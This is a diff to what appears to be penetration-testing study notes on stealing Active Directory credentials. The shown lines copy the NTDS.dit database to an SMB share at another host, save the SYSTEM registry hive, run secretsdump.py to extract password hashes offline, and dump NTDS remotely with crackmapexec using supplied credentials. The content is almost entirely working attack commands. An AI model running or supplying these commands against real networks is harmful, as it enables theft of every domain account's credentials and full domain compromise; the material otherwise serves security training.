@@ -35,6 +35,13 @@ To transfer file into linux smb server:
 ```bash
 PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
 ```
+After transfering .dit file we also need system hive to dump hashes.
+`reg.exe save hklm\system C:\system.save` and then transfer it too.
+## Dumping hashes
+```bash
+sudo python3 secretsdump.py -system system.save -ntds NTDS.dit local
+```
+
 ## Capturing ntds from linux
 ```bash
 crackmapexec smb 10.129.201.57 -u username -p password --ntds
